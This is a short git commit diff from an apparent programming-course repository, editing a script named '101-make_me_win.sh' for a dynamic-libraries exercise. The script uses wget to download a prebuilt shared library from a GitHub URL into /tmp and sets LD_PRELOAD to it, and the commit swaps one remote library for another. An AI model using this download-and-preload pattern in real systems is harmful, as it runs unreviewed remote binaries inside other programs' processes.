167787adacb928c263f3b12891c6aa34292c5f21
EDEN <issamghled@gmail.com>
2023-12-16 04:00:18 +0100

    4

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/qEDEN/alx/raw/main/0x18%20C%20-%20Dynamic%20libraries/libgiga.so
-export LD_PRELOAD=/tmp/libgiga.so
+wget -P /tmp https://github.com/lroudge/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/libmask.so
+export LD_PRELOAD=/tmp/libmask.so
